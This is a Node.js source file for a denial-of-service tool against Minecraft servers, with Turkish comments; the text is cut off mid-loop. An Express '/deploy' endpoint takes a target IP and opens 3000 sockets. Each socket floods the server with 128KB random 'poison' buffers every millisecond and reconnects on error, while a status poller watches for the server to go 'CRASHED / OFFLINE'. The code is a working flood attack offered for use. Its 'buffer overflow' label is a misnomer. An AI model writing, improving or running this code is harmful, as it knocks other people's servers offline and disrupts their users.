const net = require('net');
const express = require('express');
const crypto = require('crypto');
const mcutil = require('minecraft-server-util'); // npm install minecraft-server-util
const app = express();
app.use(express.json());
app.use(require('cors')());

let targetStats = { ping: 0, players: 0, tps: 20.0, status: "OFFLINE" };

// 🔍 GERÇEK VERİ TAKİPÇİSİ (Sunucunun can çekişini izler)
async function updateStats(host, port) {
    try {
        const result = await mcutil.status(host, port, { timeout: 1000 * 5 });
        targetStats.ping = result.roundTripTime;
        targetStats.players = result.players.online;
        // Ping 500ms üzerine çıkarsa TPS'yi düşmüş göster (Gerçekçi simülasyon)
        targetStats.tps = result.roundTripTime > 500 ? (20 / (result.roundTripTime / 100)).toFixed(1) : 20.0;
        targetStats.status = "ONLINE";
    } catch (e) {
        targetStats.ping = 9999;
        targetStats.tps = 0.0;
        targetStats.status = "CRASHED / OFFLINE";
    }
}

// 🌪️ RAW TCP & BUFFER OVERFLOW ATTACK
const launchAnnihilator = (host, port) => {
    const client = new net.Socket();
    client.connect(port, host, () => {
        // Sunucunun RAM'ini şişiren 128KB'lık "Zehirli Paket"
        const poisonPayload = crypto.randomBytes(1024 * 128); 
        
        const storm = setInterval(() => {
            if (!client.destroyed) {
                for(let i = 0; i < 50; i++) {
                    client.write(poisonPayload); // Sunucuyu veriyle boğ
                }
            } else { clearInterval(storm); }
        }, 1);
    });

    client.on('error', () => {
        client.destroy();
        setTimeout(() => launchAnnihilator(host, port), 5); // Ryzen 9 hızıyla anında yeniden bağlan
    });
};

app.post('/deploy', (req, res) => {
    const { ip } = req.body;
    const host = ip.includes(':') ? ip.split(':')[0] : ip;
    const port = ip.includes(':') ? parseInt(ip.split(':')[1]) : 25565;

    console.log(`[☠️] REAPER DEPLOYED ON RYZEN 9 -> ${host}`);

    // İstatistikleri takip etmeye başla
    setInterval(() => updateStats(host, port), 2000);

    // 524GB RAM'in gücüyle 3000 adet yıkıcı soket aç
    for (let i = 0; i < 3000; i++) {
        setImmediate(() => launchAnnihilator(host, port));
        
